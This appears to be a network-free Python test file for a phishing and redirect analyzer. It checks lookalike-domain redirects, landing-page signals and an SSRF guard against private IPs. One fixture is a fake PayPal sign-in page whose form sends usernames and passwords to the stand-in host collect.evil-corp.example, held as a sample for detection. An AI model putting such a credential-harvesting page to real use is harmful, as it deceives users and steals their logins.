"""Redirect-chain + landing-page tests — fully network-free.

A scripted fake transport stands in for HTTP and a fake resolver
returns public IPs, so chains, landing signals and the SSRF guard are
all exercised without touching the network.
"""

from app.core.redirects import analyze_redirects, follow_chain

PUBLIC = lambda host: ["93.184.216.34"]  # noqa: E731 - example.com's public IP class


def make_transport(script):
    """script: {url: (status, headers, body_bytes)}"""

    def transport(url, timeout):
        if url not in script:
            raise ConnectionError(f"no scripted response for {url}")
        status, headers, body = script[url]
        return {"status": status, "headers": headers, "body": body}

    return transport


def url_analysis(*urls):
    return {
        "urls": [
            {"url": u, "display_text": None, "source": "body", "host": None, "scheme": "https", "flags": [], "points": 0, "suspicious": False}
            for u in urls
        ],
        "url_count": len(urls),
        "suspicious_count": 0,
        "url_points": 0,
    }


PHISH_LANDING = b"""<html><head><title>PayPal - Sign In</title></head><body>
<p>Verify your account: unusual activity detected. Sign in to your account to restore access.</p>
<form action="https://collect.evil-corp.example/post"><input type="text" name="u"><input type="password" name="p"></form>
</body></html>"""


def test_cross_domain_redirect_to_harvest_page_flags():
    script = {
        "https://bit.ly/abc123": (302, {"location": "https://paypa1-secure-login.com/login"}, b""),
        "https://paypa1-secure-login.com/login": (200, {"content-type": "text/html"}, PHISH_LANDING),
    }
    analysis = url_analysis("https://bit.ly/abc123")
    summary = analyze_redirects(analysis, transport=make_transport(script), resolver=PUBLIC)
    entry = analysis["urls"][0]
    names = {f["name"] for f in entry["flags"]}
    assert "shortener_expansion" in names
    assert "redirect_cross_domain" in names
    assert "landing_password_form" in names
    assert "landing_cross_domain_form" in names
    assert "landing_brand_impersonation" in names
    assert all(f.get("source") == "redirect" for f in entry["flags"])
    assert entry["points"] > 0 and analysis["url_points"] > 0
    assert summary["checked"] == 1 and summary["fetched"] == 1


def test_same_domain_benign_redirect_does_not_flag():
    script = {
        "https://example.com/old": (301, {"location": "https://example.com/new"}, b""),
        "https://example.com/new": (200, {"content-type": "text/html"}, b"<html><body>Welcome.</body></html>"),
    }
    analysis = url_analysis("https://example.com/old")
    analyze_redirects(analysis, transport=make_transport(script), resolver=PUBLIC)
    entry = analysis["urls"][0]
    assert entry["flags"] == []
    assert entry["redirect"]["final_url"] == "https://example.com/new"
    assert analysis["url_points"] == 0


def test_private_ip_target_is_refused():
    script = {"http://192.168.1.10/admin": (200, {"content-type": "text/html"}, b"<html></html>")}
    outcome = follow_chain("http://192.168.1.10/admin", transport=make_transport(script), resolver=PUBLIC)
    assert outcome["available"] is False
    assert "SSRF guard" in outcome["error"]


def test_private_resolution_is_refused():
    outcome = follow_chain(
        "https://innocent.example/login",
        transport=make_transport({}),
        resolver=lambda host: ["10.0.0.5"],
    )
    assert outcome["available"] is False
    assert "SSRF guard" in outcome["error"]


def test_fetch_error_is_fail_open():
    def boom(url, timeout):
        raise TimeoutError("timed out")

    analysis = url_analysis("https://example.com/x")
    summary = analyze_redirects(analysis, transport=boom, resolver=PUBLIC)
    entry = analysis["urls"][0]
    assert entry["redirect"]["available"] is False
    assert "fetch failed" in entry["redirect"]["error"]
    assert summary["checked"] == 1  # analysis continued, no exception


def test_feed_matched_url_is_not_fetched():
    analysis = url_analysis("https://known-bad.example/phish")
    analysis["urls"][0]["flags"].append({"name": "feed_match", "status": "fail", "detail": "in feed", "points": 40, "source": "feed"})
    called = []

    def transport(url, timeout):
        called.append(url)
        return {"status": 200, "headers": {}, "body": b""}

    summary = analyze_redirects(analysis, transport=transport, resolver=PUBLIC)
    assert called == []
    assert summary["skipped_feed_matched"] == 1
